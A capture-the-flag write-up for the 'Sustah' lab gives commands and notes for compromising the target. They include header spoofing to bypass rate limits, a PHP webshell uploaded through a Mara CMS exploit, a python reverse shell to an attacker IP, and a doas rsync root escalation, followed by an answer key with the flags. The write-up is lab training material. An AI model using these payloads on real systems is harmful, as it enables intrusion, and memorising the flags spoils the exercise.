# Sustah - Medium

```shell
sudo vim /etc/hosts
#add sustah.thm

nmap -T4 -p- -A -Pn -v sustah.thm

feroxbuster -u http://sustah.thm -w /usr/share/wordlists/dirb/common.txt -x php,html,bak,js,txt,json,docx,pdf,zip,aspx,sql,xml --extract-links --scan-limit 2 --filter-status 400,401,404,405,500

feroxbuster -u http://sustah.thm:8085 -w /usr/share/wordlists/dirb/common.txt -x php,html,bak,js,txt,json,docx,pdf,zip,aspx,sql,xml --extract-links --scan-limit 2 --filter-status 400,401,404,405,500

#using ffuf instead of burp suite

#generate wordlist
seq 10000 99999 > numbers.txt

ffuf -w numbers.txt -X POST -d "number=FUZZ" -u http://sustah.thm:8085/home -H "Content-Type: application/x-www-form-urlencoded" -H "X-Originating-IP: 127.0.0.1" -H "X-Forwarded-For: 127.0.0.1" -H "X-Remote-IP: 127.0.0.1" -H "X-Remote-Addr: 127.0.0.1" -H "X-Client-IP: 127.0.0.1" -H "X-Host: 127.0.0.1" -H "X-Forwared-Host: 127.0.0.1"
#this gives false positives with 157 words

ffuf -w numbers.txt -X POST -d "number=FUZZ" -u http://sustah.thm:8085/home -H "Content-Type: application/x-www-form-urlencoded" -H "X-Originating-IP: 127.0.0.1" -H "X-Forwarded-For: 127.0.0.1" -H "X-Remote-IP: 127.0.0.1" -H "X-Remote-Addr: 127.0.0.1" -H "X-Client-IP: 127.0.0.1" -H "X-Host: 127.0.0.1" -H "X-Forwared-Host: 127.0.0.1" -fw 157
#this gives us the correct number

searchsploit mara cms
#gives us RCE exploit

searchsploit -x php/webapps/48780.txt
#follow the exploit

echo "<?php system($_GET["cmd"]); ?>" > simple-webshell.php
#upload the webshell to required path

#setup listener
nc -nvlp 4444
#execute reverse-shell command in webshell

#we get reverse-shell
whoami
#www-data

python -c 'import pty;pty.spawn("/bin/bash")'

cd /tmp

#get linpeas.sh from attacker machine server
wget http://10.14.31.212:8000/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh

#search for backups

ls -la /var

ls -la /var/backups

cat /var/backups/.bak.passwd
#this contains password for user 'kiran'

su kiran
#use cleartext password
#this works

cd

cat user.txt

#search for sudo alternatives

which doas

ls -la /usr/local/bin/doas
#this has SUID bit set

locate doas.conf

cat /usr/local/etc/doas.conf
#we can run rsync as root

#exploit from GTFObins
doas -u root rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
#this gives root shell
```

* Open ports & services:

  * 22 - ssh - OpenSSH 7.2p2 (Ubuntu)
  * 80 - http - Apache httpd 2.4.18
  * 8085 - http - Gunicorn 20.0.4

* The webpage on port 80 contains a quote and an image.

* Using ```feroxbuster```, we can start enumerating web directories.

* We can also check the webpage on port 8085 - this contains a game of 'Spinner Wheel'

* While we interact with this game, we can scan the web directories on this port as well.

* We do not get any hidden directories, so we have to try other ways.

* Since the question asks for a number that reveals a path, and it mentions a 5-digit number, we can attempt brute-forcing.

* We can use Burp Suite Proxy to intercept & capture the request which includes the 'number' parameter.

* Then, we can send this request to Intruder, and brute-force using Sniper mode, such that our payload is in the range 10000-99999 (all 5-digit numbers).

* Now, after a few requests, we get error in Responses - it includes the headers of type 'X-RateLimit-*' and 'Retry-After'.

* To solve this, we have to modify our intercepted request and include a few headers to [bypass X-RateLimit headers](https://book.hacktricks.xyz/pentesting-web/rate-limit-bypass); these headers include:

```markdown
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: 127.0.0.1
X-Forwared-Host: 127.0.0.1
```

* Now, Burp Suite takes a lot of time for this, so we can use ```ffuf``` as an alternate.

* To craft the command required, we can get headers from the POST request, and include the additional headers to bypass ```X-RateLimit```.

* Initially running ```ffuf``` gives us false positives with 157 words; on adding the ```-fw``` flag to ignore these false positives - we get the correct number response.

* When we input the correct number in the Spinner webpage, we get the path "/YouGotTh3P@th" as a result.

* Checking the path on port 8085 gives the ```Not Found``` error, but checking this path on port 80 leads us to a page for ```Mara CMS```.

* We can get the version by checking the 'About' page - it shows 7.x as version.

* Using ```searchsploit```, we can search for exploits related to ```mara```, and these exploits show version 7.5 for the CMS.

* Now, in the 'Test Page' section, the creds "admin:changeme" are given, which can be used to log into the CMS dashboard as Admin.

* Now, following the exploit, we can navigate to the ```Mara CMS``` file upload path by going to /YouGotTh3P@th/codebase/dir.php?type=filenew (in the CMS path).

* Here, we can upload our PHP webshell, and it shows that the webshell has been uploaded to <http://sustah.thm/YouGotTh3P@th/img/>

* So, we can check the webshell by visiting this link:

```http://sustah.thm/YouGotTh3P@th/img/simple-webshell.php?cmd=whoami```

* This works, and we get RCE as ```www-data```.

* We can now setup a listener, and get reverse shell by executing the reverse-shell one-liner in webshell:

```export RHOST="10.14.31.212";export RPORT=4444;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'```

* In our reverse-shell, we can begin enumerating for privesc using ```linpeas```.

* ```linpeas``` does not give anything, and the clue given is to search for backups.

* Checking the ```/var/backups``` directory, we have a '.bak.passwd' file which seems to be readable.

* Printing this file shows that there is a password in cleartext for user 'kiran'.

* Attempting to use this password by switching to user 'kiran' works and we can now read the user flag.

* Now, ```linpeas``` is unable to find anything in this case, so we have to manually search.

* The clue given to us is 'we always do not need sudo' - this means we can check for alternatives of 'sudo'.

* One alternative of 'sudo' is 'doas' - and we have it on victim machine.

* Now, ```doas``` has SUID bit set; furthermore, the ```doas.conf``` file shows that we can ```rsync``` as root without password.

* We can search for ```rysnc``` exploits on GTFObins - we can run it using ```doas``` and get root shell.

```markdown
1. What is the number that revealed the path? - 10921

2. Name the path. - /YouGotTh3P@th/

3. What is the name of the CMS? - Mara

4. What version of the CMS is running? - 7.5

5. What is the user flag? - 6b18f161b4de63b5f72577c737b7ebc8

6. What is the root flag? - afbb1696a893f35984163021d03f6095
```
